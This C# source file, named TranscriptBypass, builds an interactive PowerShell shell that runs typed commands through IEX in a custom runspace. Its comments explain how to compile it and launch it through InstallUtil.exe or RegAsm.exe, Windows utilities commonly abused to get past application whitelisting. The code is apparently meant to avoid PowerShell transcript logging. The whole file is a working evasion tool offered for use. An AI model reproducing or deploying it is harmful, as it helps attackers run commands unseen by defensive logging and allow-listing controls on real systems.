using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;

namespace TranscriptBypass
{
    // Compiling with CSC.exe v4.0.30319 or v3.5
    // C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:C:\Temp\posh.exe C:\Temp\posh.cs /reference:System.Management.Automation.dll
    // C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /out:c:\temp\posh.exe C:\temp\posh.cs /reference:System.Management.Automation.dll

    // Running via InstallUtil.exe
    // C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\temp\posh.exe

    // Compiling with CSC.exe v4.0.30319 or v3.5 for use with regasm.exe
    // C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:C:\Temp\posh.dll C:\Temp\posh.cs /reference:System.Management.Automation.dll
    // C:\Windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:c:\temp\posh.dll C:\temp\posh.cs /reference:System.Management.Automation.dll

    // Running via RegAsm.exe
    // C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U C:\temp\posh.dll

    public class Program
    {
        public static Runspace newrunspace;
        public static void startrunspace()
        {
            newrunspace = RunspaceFactory.CreateRunspace();
            newrunspace.Open();
            var cmd = new System.Management.Automation.PSVariable("c");
            newrunspace.SessionStateProxy.PSVariable.Set(cmd);
            var output = new System.Management.Automation.PSVariable("o");
            newrunspace.SessionStateProxy.PSVariable.Set(output);
            
        }
        public static string InvokeAutomation(string cmd)
        {
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
            Pipeline pipeline = newrunspace.CreatePipeline();
            newrunspace.SessionStateProxy.SetVariable("c", cmd);
            if (cmd == "$a;")
            {
                return "";
            }
            else
            {
                pipeline.Commands.AddScript("$o = IEX $c | Out-String");
            }
            
            Collection<PSObject> results1 = pipeline.Invoke();
            object results2 = newrunspace.SessionStateProxy.GetVariable("o");
            return results2.ToString();

        }
        public static void Main()
        {
            try
            {
                startrunspace();
                string ps = null;
                Console.Write("PS>");
                while (!String.IsNullOrEmpty(ps = "$a;" + Console.ReadLine().Trim()))
                {
                    try
                    {
                        Console.WriteLine(InvokeAutomation(ps));
                    }
                    catch (Exception ex)
                    {
                        Console.Write(ex.Message);
                    }
                    Console.Write("PS>");
                }
            }
            catch
            {
                Main();
            }
        }
    }
}